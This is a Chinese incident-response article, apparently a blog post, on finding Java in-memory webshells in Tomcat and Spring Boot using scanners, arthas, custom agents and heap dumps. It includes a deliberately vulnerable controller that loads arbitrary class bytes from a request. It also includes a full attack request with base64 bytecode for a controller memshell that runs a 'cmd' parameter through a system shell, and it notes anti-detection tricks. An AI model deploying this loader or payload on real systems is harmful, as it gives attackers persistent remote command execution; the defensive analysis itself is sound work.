0x01 前言
=======

内存马在攻防中的是一个非常常见的手段，因此内存马排查也是每个应急人员必须掌握的技能，而在应急场景中遇到内存马的场景，基本都是基于java的web服务，所以此文主要从应急实践角度总结对一些JAVA常见内存马实现展开排查分析的经验；供防守人员参考；  
本文主要是对各类型JAVA内存马分析，以及使用各种手段开展分析排查；

0x02 常见内存马
==========

**笔者对内存马的理解**

这里我们使用一些通俗易懂的语言先来解释下内存马：首先物如其名，内存马是在内存中实现的马，换个角度说最终的内存马形态就是没有任何东西落地，这些东西存在内存中；内存马我们都打过，那下内存马是怎么做到的接管web应用的处理逻辑的呢，java里面web应用的处理逻辑实现无非就是通过一些类的定义来实现的；所以想要接管web应用的处理逻辑，其实就是两种方法，一种是直接篡改他，一种是顺着他利用其自己的一些特性去接管他；就是如下两种方法：

> 第一种方式是研究如何去修改jvm里面的web应用一些处理逻辑类的实现，从而实现修改web应用的处理逻辑；
> 
> 第二种方法是顺着web应用来，利用web应用自身的可拓展性，比如其一些服务组件可以动态的增添的特性来实现接管web应用对请求的处理逻辑；

同时这里我们也可以看出第一种方法的处理范围一定程度上肯定是比第二种大的，但是这里并不是包含关系，一个是对类的实现篡改，一个是添加；

一、常见内存马分类
---------

笔者习惯把java内存马根据实现方式的不同分为3类：

> 1、基于动态注册Servlet组件（Servlet、Filter、Listener）实现的内存马
> 
> 2、基于动态注册框架的组件实现的内存马
> 
> 3、基于javaagent的动态修改类字节码实现的内存马

不难看出，这里的 1、2其实就是上文提到的第二种大类方法实现内存马，其利用web应用的一些特性，也就是一些服务组件来接管web应用对web请求的处理逻辑；3则是第一类方法实现内存马，其是通过javagent技术attach到jvm，然后修改web应用在jvm里面的相关关键类，比如随便找一个接口或者父类，如果正常web请求进来会去使用这个接口的实现或父类的子类的某些方法（注意：这里其实也可以使用1、2种提到的那些web应用组件的类，但是一般都不会这么做，因为你可能并不知道web应用上本身存在哪些组件实例，其实例叫什么，所以更多的是找一些被用于处理请求的通用类），那么就可以去构造恶意类实现对应接口或者继承对应子类，写入webshell逻辑实现内存马，使处理逻辑会触发我们构造的恶意类逻辑即可；

二、常见类型内存马实现及排查检测
----------------

这里我们从实践角度不在重复相关内存马的实现细节，相关类型内存马的实现细节可以参考笔者两年前写的一个篇对各类型内存马分析和实践的文章:[内存马的一生](https://minhangxiaohui.github.io/2024/09/04/%E5%BF%86%E5%BE%80%E6%98%94_JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E7%94%9F/)，而本文也算继其之后对内存马系列知识从防守方的补充；

### 1、在tomcat里面动态注入JAVA Servlet组件实现的内存马

我们直接通过jsp的方式分别注入Servlet、Listerner、Filter，注入后效果如下：

[相关代码 参考上面提到的文章](https://minhangxiaohui.github.io/2024/09/04/%E5%BF%86%E5%BE%80%E6%98%94_JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E7%94%9F/)

创建了一个新的Servlet,对应的路径是`/servletmemshell`

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-6dbf286c6442fcb0d438097aa63a0852f947cd92.png)

创建了一个Listerner,访问任何存在路径，都会触发：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-3b2f59a1a92b2ed1753beaa404b266b23f205975.png)

创建了一个Filter，过滤所有`/Filter_shell/`下的访问

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-bf55404aa8b9dff277f352e8b0a0f2698bb7fe38.png)

首先我们要了解排查的原理，对于这类的内存马，是通过添加一些组件实现的，每种组件都有一个父类，我们可以遍历jvm里面的所有类，找到继承了上面三种公共父类的类或者是实现的公共接口，又或者是找到这些类的其他公共特征，然后输出类名及路径开展排查，一般来说比较简单粗暴的排查方法可以借助内存马的性质来做，即观察本地是否存在相关类文件落地，没有就是重点怀疑对象；

#### 方法1

这里我们通常可以借助c0ny1师傅写的这个jsp脚本，这个jsp脚本通过一些方法拿到StandardConetext，然后借助其找得到servletMap、Listenerlist、filterMap这些列表，这些列表有此web应用里所有的servlet、listerner、filter的实例；

脚本：<https://github.com/c0ny1/java-memshell-scanner/blob/master/tomcat-memshell-scanner.jsp>

使用方法，直接将jsp丢到可访问可执行的路径，然后web触发jsp代码逻辑即可；

效果：如下图中名称里面带`$`表示匿名内部类，这种也是比较可疑的，一般来说三大组件里面的类都是有正常名的，出现这种情况，大概率时攻击者构造内存马的时候创建相关恶意组件类实例，没有命名，创建的是匿名类实现对应接口，可以看到十分简单快捷的找出了上面三种内存马；（一般实战中攻击者比较喜欢使用filter类型的马，我们可以观察Patern字段，这个字段是该filter过滤的url特征）；然后一般情况下，我们需要关注一些重点业务实例类，也就是可能存在被利用的servlet组件实例，比如下图中，我们都是通过jsp去注入的内存马，jsp本身就是一个特殊的servlet，所以我们看到所以的匿名内部类的外部类都是jsp下的一个实例类；

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-582caf92506e857395c84d0546567835612b5799.png)

这里多说一嘴，可以看到里面还有kill的选项，这个kill是可以把内存马干掉的，干掉的原理也非常简单，怎么加的，反过来删除卸载即可，只要拿到的StandardContext了，可以“为所欲为”；

小捷径：tomcat下，攻击者通过jsp注入（或者通过一些其他rce）这类内存马时（注入后删除jsp），大概率会使用匿名内部类实现相关接口创建实例，所以这里我们可以尝试去`根目录/ROOT/org/apache/jsp/`目录，看是否存在相关带`$`的class文件；逐一检查；

#### 方法2

通过java agent attach到jvm里面（同时这也是3那种内存马的实现方式），尝试找到一些关键业务接口的实现类，查看关键类的字节码的实现，是否存在恶意逻辑；或者尝试找一些servlet组件的接口或父类，查看接口实现实例或者子类实现逻辑，是否存在恶意逻辑即可；

这里我们借助阿里提供的jvm诊断工具arthas来看下：<https://github.com/alibaba/arthas>

这个工具主要依靠应急的人自己去排查，简单的说，对于应急人员来说，他就是提供了一个获取所有jvm 类名包名的工具，这个工具集成了dump指定类字节码的功能，你发现了可疑类之后，就可以借助这个来排查；

如下：我想要排查相关Servlet的时候，我可以尝试使用`sc *Servlet*`命令，找下所有类名里面出来了servlet的类；（这里一般的排查逻辑还可以用jsp去做，因为如果我们知道这个就是一个tomcat ，下面没有其他组件就是一个jsp后台，那么可能被攻击的业务逻辑，就只能是jsp，所以我们也可以尝试 `sc *jsp*`，看下是否有异常jsp实例）

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-6fde7eab4f316eb9f8de08ebbeed931d38812fe4.png)

然后对可疑的类进行反编译，查看实现：`jad +类名`

这里我们看到`servletmemshell_jsp$1`比较可疑，但是有两个，所以我们先要获取其hashcode，使用命令`sc -d 类名`

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-5ee7f7c19564d84d2934182935bd8adee0684368.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-8cf40993be47b314f09108ae3184378fbe67e4fb.png)

随便选一个，执行命令`sc -c 57f57479 类名` ，如下图，可以看到其代码实现，（对于servlet这种一般而恶意逻辑都写到service方法里面）

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-f36c4f453d3c3d8b501c054e2c01f96c823d0880.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-34587bb30ec9b3305dd440ee989a16230694f6d5.png)

或者，在不知道是什么形式（`filter/listener/servlet`）的马的时候，我们可以把实现了这些接口的类都找出来：

JAVA Servlet组件接口：

```php
javax.servlet.Servlet  
javax.servlet.Filter  
javax.servlet.ServletRequestListener
```

进入arthas，我们先打开日志，后面要用，默认是关闭的

`options save-result true`

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-20b4fe77c334deaf46bf50f52f22f7dd9982dbc6.png)

然后就是三连查（注意arthas并没有提供可以查看接口实现类的方式，而且查询结果超过100个类，也不会返回，所以这里我们用sc查的时候尽量把类前面写全）：

```php
sc -d javax.servlet.Servlet\*  
​  
sc -d javax.servlet.Filter\*  
​  
sc -d javax.servlet.ServletRequestListener\*  
​  
或者：  
sc -d \* --interfaces javax.servlet.Servlet  
​  
sc -d \* --interfaces javax.servlet.Filter\*  
​  
sc -d \* --interfaces javax.servlet.ServletRequestListener\*\
```

然后找到日志记录文件：

文件默认路径：

`{user.home}/logs/arthas-cache/result.log`

打开日志，查接口实现了上面上个接口的类，这里我们拿servlet举例，使用正则匹配

`interfaces        javax\\.servlet\\.Servlet`

结果，一共三个，其中两个都是`org.apache.jsp.servletmemshell_jsp$1`，jsp servlet产生的匿名内部类（这里相同的类出现了两次，因该是arthas的类检索机制导致的，如果一个类被多个classloader加载，-d参数检索出来的类，就会出现多次）

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-78b9b455bca6713a311030aee97494e74094ce36.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-2d115eca8a60b1fab3d054825488e81182d09df2.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-37db39b01193cc702824505fd3a3ef9fd91cf29e.png)

然后就是jad 拿到字节码，分析逻辑判断，同上；

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-4ca5e0f4d4e6d6572784a6b7736063636d3a5c61.png)

总的来说，这个athas的自由度非常大，主要看排查人员的排查逻辑思维；同时如果是指向性排查这里就比较方便了（其实大多数时候都是这种场景），如：通过流量测，我们看到了攻击者使用某个漏洞接口进行了攻击，随后便产生了大量的内存马连接流量（如：ids类设备上出现一堆冰蝎、哥斯拉类的告警），那么其实我们是知道大概率就是这里打进来的，打了内存马；但是应急排查是要讲证据的，讲究眼见为实，端侧流侧结合，应急报告内容才能被客户高度认可（~其实不然，笔者觉得不管黑猫还是白猫，能捉老鼠才是好猫；只要报告推理有条，逻辑严谨，只有一侧也是可以的~）；所以这里我们可以协同对于第三方业务系统开发人员，咨询相关接口的实现类，然后去排查对应类

#### 方法3

这里我们还是使用java agent的形式注入，但是不一样的是，我们需要对相关逻辑进行固化（主要是对一些类的处理逻辑，比如：类名是否存在敏感词、实现了什么接口、其关键方法里面是否出现了webshell逻辑等），也就是方法2的升级版，把我们的一些经验写进去，属于是智者见智，仁者见仁；

22年的时候笔者写过一个demo项目：

<https://github.com/minhangxiaohui/JavaAgentMemshell>

这个项目里面的case4，就是这种思路，如下：

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-3d24c47a25b4c50308ae301902a1a1a8ed61bf49.png)

这种方法，是通过自己编写agent，注入到jvm对应进程里面，或取所有加载类的类名及字节码，通过自己固化的一些排查经验展开排查，属于对第二类方法的自动化，通过慢慢积累可以实现一套自己的排查工具；

同时这种方法也可以消除内存马，修复内存马；消除和修复的原理就是使用Javassist技术或者asm去对拿到的类，动态的修改类的方法实现；可以参考上面项目的case5；

这里笔者在网上找了下，是否存在比较完善的上述方法到落地实践项目，目前没有找到，和我之前的项目差不多都是一些demo，实战应该用不太上；之后看自己能不能积累下搞了项目把；

#### 方法4

dump 内存分析，是否存在内存马；这种方法主要是对前面三种的补充，我们会发现第二种和第三种其实都依靠agent attach到jvm里面，但是有些攻击者会使用对抗分析排查的手段，阻挠我们去attach，比如：冰蝎的反检测分析的手段，会干掉jvm线程之间的通信管道的建立要用到`.java_pid\<pid>`这个文件,阻止JVM进程通信，从而禁止了Agent的加载。Agent无法注入，上文提到的方法2、3就使用不了了，从而实现了反查杀；

反差杀技术的详细描述相关详情参考笔者之前写的[文章](https://minhangxiaohui.github.io/2024/09/04/%E5%BF%86%E5%BE%80%E6%98%94_JAVA%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E7%94%9F/)

文章里面的 第四章节：内存马反查杀技术；

这里我们通过分析通过dump下来的内存实现对java内存马的分析；

使用java自带的工具，jmap，我们dump heap下来：

```php
jps  
jmap -dump:format=b,file=<filename> <pid>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-258dcd76fd1ea3b1db2ab330491c5108c3df88ee.png)

思路：内存马，不就是存在内存里面的吗，那我们直接把内存dump下来，然后在里面分析不就成了；这里我们需要思考，内存马在内存中可能的存在形式，jvm能够直接处理的应该是字节码文件class，所以我们可以尝试在内存中寻找字节码文件，字节码文件头的16进制特征：`cafebabe`；也可以直接搜恶意类可能出现的敏感词，shell 、memshell、eval、inject之类的；也可以查内存中遗留的访问记录，查看是否存在相关访问是内存马利用和链接的；

如下，我们找到了多处字节码文件内容，而且我们能看到类名，同时也能找到，三种内存马的实现：

Servelt:

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-b0f4d3c88b7d74622c530c8277a93bb4d2e12065.png)

Listener:

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-9771b67463afc620e72e3c1a3bfabf9c003070d3.png)

Filter:

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-a9edddb48e619df112e0ec99d979eb967ad17b67.png)

### 2、在jar环境中动态注入相关jar环境组件实现的内存马

这里我们使用springboot作为实验环境，通过jar起springboot的环境，写了一个controller，这个controller模拟受害接口及其业务处理逻辑（接收两个class，加载，并调用指定方法，其实就是常见的java任意代码执行的一个shell，冰蝎、哥斯拉差不多，但是这里加载两个class，因为我们注入controller内存马的时候使用了内部类，所以这里我们要加载内部类和外部类，业务逻辑这里就模拟加载指定class的场景），利用该接口注入springboot里面的controller组件的内存马；

![image.png](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-424034d21812c332bc889c0e94d5025193f4cfa5.png)

受害controller的逻辑：

```php
package priv.ga0wei.springbootformemshell.control;  
​  
import org.springframework.stereotype.Controller;  
import org.springframework.web.bind.annotation.RequestMapping;  
import org.springframework.web.bind.annotation.ResponseBody;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import java.lang.reflect.Method;  
import java.util.Base64;  
​  
​  
​  
@Controller  
public class BadControl {  
​  
    public class ByteArrayClassLoader extends ClassLoader {  
        public ByteArrayClassLoader(ClassLoader parent) {  
            super(parent);  
        }  
        public Class<?> defineClassFromByteArray(byte\[\] byteArray) {  
            return super.defineClass(byteArray, 0, byteArray.length);  
        }  
    }  
​  
    @ResponseBody  
    @RequestMapping("/loadclass")  
    public void noshell(HttpServletRequest request, HttpServletResponse response) throws Exception {  
​  
​  
        // 获取cmd参数并执行命令  
        String all = request.getReader().readLine();  
        String\[\] a = all.split("&");  
        byte\[\] classData = Base64.getDecoder().decode(a\[0\].replace("mainclass=", ""));  
        byte\[\] classinnerData = Base64.getDecoder().decode(a\[1\].replace("innerclass=", ""));  
​  
        // 创建自定义的 ClassLoader 实例  
        ClassLoader parentClassLoader = Thread.currentThread().getContextClassLoader();  
        ByteArrayClassLoader loader = new ByteArrayClassLoader(parentClassLoader);  
        // 定义并加载类  
        Class<?> clazz = loader.defineClassFromByteArray( classData);  
        loader.defineClassFromByteArray(classinnerData);  
​  
        // 现在可以使用加载的类了  
        Object instance = clazz.getDeclaredConstructor().newInstance();  
        System.out.println("Class loaded: " + clazz.getName());  
        System.out.println("Instance created: " + instance);  
        // 获取无参数方法并调用  
        Method method = clazz.getMethod("Injectshell"); // 调用注入内存马逻辑的方法  
        method.invoke(instance); // 不传递参数  
​  
    }  
​  
}  
​  
​  
​  
```

对该接口发起请求，并传入两个class字节码的base64：

```php
POST /loadclass HTTP/1.1  
Host: 127.0.0.1:8080  
Content-Length: 8558  
​  
mainclass=yv66vgAAADQAigoAIgBGCgBHAEgHAEkKAAMASggASwsATABNBwBOBwBPCwAHAFAHAFEIAFIHAFMKAAwAVAcAVQcAVggAVwoADgBYBwBZBwBaCgASAFsHAFwKABUAXQgAXgoACgBfCgAIAGAJAGEAYggAYwoAZABlCwBmAGcIAGgKAGkAZQgAagcAawcAbAEABEV2aWwBAAxJbm5lckNsYXNzZXMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAGUxNeUV2YWxDbGFzc19pbmplY3RzaGVsbDsBAAtJbmplY3RzaGVsbAEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAB2NvbnRleHQBADdMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQ7AQAVbWFwcGluZ0hhbmRsZXJNYXBwaW5nAQBUTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nSGFuZGxlck1hcHBpbmc7AQAGbWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAN1cmwBAEhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbjsBAAJtcwEATkxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uOwEABGluZm8BAD9Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBABJpbmplY3RUb0NvbnRyb2xsZXIBAB5MTXlFdmFsQ2xhc3NfaW5qZWN0c2hlbGwkRXZpbDsBAApFeGNlcHRpb25zBwBtBwBuAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBABxNeUV2YWxDbGFzc19pbmplY3RzaGVsbC5qYXZhDAAlACYHAG8MAHAAcQEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMAHIAcwEAOW9yZy5zcHJpbmdmcmFtZXdvcmsud2ViLnNlcnZsZXQuRGlzcGF0Y2hlclNlcnZsZXQuQ09OVEVYVAcAdAwAdQB2AQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9XZWJBcHBsaWNhdGlvbkNvbnRleHQBAFJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9tZXRob2QvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZ0hhbmRsZXJNYXBwaW5nDAB3AHgBABxNeUV2YWxDbGFzc19pbmplY3RzaGVsbCRFdmlsAQAEdGVzdAEAD2phdmEvbGFuZy9DbGFzcwwAeQB6AQBGb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL1BhdHRlcm5zUmVxdWVzdENvbmRpdGlvbgEAEGphdmEvbGFuZy9TdHJpbmcBAAcvaGVsbG9zDAAlAEEBAExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uAQA1b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNZXRob2QMACUAewEAPW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8MACUAfAEAA3h4eAwAJQB9DAB+AH8HAIAMAIEAggEADOa1i+ivlXh4eHh4eAcAgwwAhACFBwCGDACHAIgBAA5pbmplY3Qgc3VjY2VzcwcAiQEAB3N1Y2Nlc3MBABdNeUV2YWxDbGFzc19pbmplY3RzaGVsbAEAEGphdmEvbGFuZy9PYmplY3QBAB9qYXZhL2xhbmcvTm9TdWNoTWV0aG9kRXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEAOW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlcwEADGdldEF0dHJpYnV0ZQEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvT2JqZWN0OwEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAOyhbTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWV0aG9kOylWAQH2KExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGF0dGVybnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdE1ldGhvZHNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUGFyYW1zUmVxdWVzdENvbmRpdGlvbjtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvY29uZGl0aW9uL0hlYWRlcnNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vQ29uc3VtZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUHJvZHVjZXNSZXF1ZXN0Q29uZGl0aW9uO0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L212Yy9jb25kaXRpb24vUmVxdWVzdENvbmRpdGlvbjspVgEALihMTXlFdmFsQ2xhc3NfaW5qZWN0c2hlbGw7TGphdmEvbGFuZy9TdHJpbmc7KVYBAA9yZWdpc3Rlck1hcHBpbmcBAG4oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZsZXQvbXZjL21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm87TGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDspVgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyACEAIQAiAAAAAAADAAEAJQAmAAEAJwAAADMAAQABAAAABSq3AAGxAAAAAgAoAAAACgACAAAADgAEACwAKQAAAAwAAQAAAAUAKgArAAAAAQAsACYAAgAnAAABNgAJAAkAAACQuAACwAADwAADtgAETLgAAhIFA7kABgMAwAAHTSwSCLkACQIAwAAIThIKEgsDvQAMtgANOgS7AA5ZBL0AD1kDEhBTtwAROgW7ABJZA70AE7cAFDoGuwAVWRkFGQYBAQEBAbcAFjoHuwAKWSoSF7cAGDoILRkHGQgZBLYAGbIAGhIbtgAcK7kAHQEAEh62AB+xAAAAAgAoAAAAMgAMAAAAEQANABQAHAAVACgAGAA1ABoARwAcAFQAHgBmACQAcgAmAHwAJwCEACgAjwArACkAAABcAAkAAACQACoAKwAAAA0AgwAtAC4AAQAcAHQALwAwAAIAKABoADEAMgADADUAWwAzADQABABHAEkANQA2AAUAVAA8ADcAOAAGAGYAKgA5ADoABwByAB4AOwA8AAgAPQAAAAYAAgA+AD8ACQBAAEEAAQAnAAAANwACAAEAAAAJsgAaEiC2AByxAAAAAgAoAAAACgACAAAATgAIAE8AKQAAAAwAAQAAAAkAQgBDAAAAAgBEAAAAAgBFACQAAAAKAAEACgAhACMAAQ==&innerclass=yv66vgAAADQAnwkAJABPCgAlAFAKAFEAUgcAUwoABABUCgAEAFUIAFYLAFcAWAsAWQBaCABbCABcCgBdAF4KABEAXwgAYAoAEQBhBwBiBwBjCABkCABlCgAQAGYIAGcIAGgHAGkKABAAagoAawBsCgAXAG0IAG4KABcAbwoAFwBwCgAXAHEKABcAcgoAcwB0CgBzAHUKAHMAcgcAdgcAeAcAeQEABnRoaXMkMAEAGUxNeUV2YWxDbGFzc19pbmplY3RzaGVsbDsBAAY8aW5pdD4BAC4oTE15RXZhbENsYXNzX2luamVjdHNoZWxsO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAARFdmlsAQAMSW5uZXJDbGFzc2VzAQAeTE15RXZhbENsYXNzX2luamVjdHNoZWxsJEV2aWw7AQADeHh4AQASTGphdmEvbGFuZy9TdHJpbmc7AQAEdGVzdAEAAygpVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAC3ByaW50V3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQABbwEAAWMBABNMamF2YS91dGlsL1NjYW5uZXI7AQAHaWdub3JlZAEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdjb21tYW5kAQANU3RhY2tNYXBUYWJsZQcAeAcAegcAewcAYwcAfAcAYgcAaQcAdgEACkV4Y2VwdGlvbnMBAApTb3VyY2VGaWxlAQAcTXlFdmFsQ2xhc3NfaW5qZWN0c2hlbGwuamF2YQwAJgAnDAAoADQHAH0MAH4AfwEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMAIAAgQwAggCDAQADY21kBwB6DACEAIUHAHsMAIYAhwEAAAEAB29zLm5hbWUHAIgMAIkAhQwAigCLAQADd2luDACMAI0BABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAoAI4BAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAjwCQBwCRDACSAJMMACgAlAEAAlxBDACVAJYMAJcAmAwAmQCLDACaADQHAHwMAJsAnAwAnQA0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAngEAHE15RXZhbENsYXNzX2luamVjdHNoZWxsJEV2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQATamF2YS9pby9QcmludFdyaXRlcgEAPG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0Q29udGV4dEhvbGRlcgEAGGN1cnJlbnRSZXF1ZXN0QXR0cmlidXRlcwEAPSgpTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9SZXF1ZXN0QXR0cmlidXRlczsBAApnZXRSZXF1ZXN0AQApKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAKigpTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEABWNsb3NlAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdH